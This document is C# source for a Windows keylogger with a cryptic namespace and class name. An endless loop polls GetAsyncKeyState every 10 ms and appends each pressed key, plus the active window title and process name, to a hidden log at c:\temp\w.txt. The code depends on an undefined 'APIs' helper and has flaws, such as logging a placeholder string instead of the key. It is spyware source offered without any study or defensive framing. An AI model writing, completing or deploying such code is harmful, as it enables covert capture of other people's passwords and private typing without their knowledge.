using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;

namespace nvvsv
{
    public class HK2
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        StringBuilder txt_Log = new StringBuilder();

        private Stack<string> _appNames = new Stack<string>();
        private Dictionary<string, string> _logData = new Dictionary<string, string>();

        public HK2()
        {
            StartLogging();
        }
        
        void StartLogging()
        {
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < 255; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767)
                    {
                        Logger("na");
                        File.AppendAllText(@"c:\temp\w.txt", ((Keys)i).ToString()+Environment.NewLine);
                        
                        break;
                    }
                }
            }
        }

        private void CurrentApp()
        {
 
        }

        private void Logger(string txt)
        {
            txt_Log.AppendLine(txt);

            try
            {
                Process p = Process.GetProcessById(APIs.GetWindowProcessID(APIs.getforegroundWindow()));
                string _appName = p.ProcessName;
                string _appltitle = APIs.ActiveApplTitle().Trim().Replace("\0", "");
                string _thisapplication = _appltitle + "######" + _appName;
                if (!_appNames.Contains(_thisapplication))
                {
                    _appNames.Push(_thisapplication);
                    _logData.Add(_thisapplication, "");
                }
                var en = _logData.GetEnumerator();
                while (en.MoveNext())
                {
                    var pair = en.Current;
                    if (pair.Key.ToString() == _thisapplication)
                    {
                        string prlogdata = pair.Value.ToString();
                        _logData.Remove(_thisapplication);
                        _logData.Add(_thisapplication, prlogdata + " " + txt);
                        File.AppendAllText(@"c:\temp\w.txt", _thisapplication);
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message + ":" + ex.StackTrace);
                throw;
            }
        }


    }
     
}
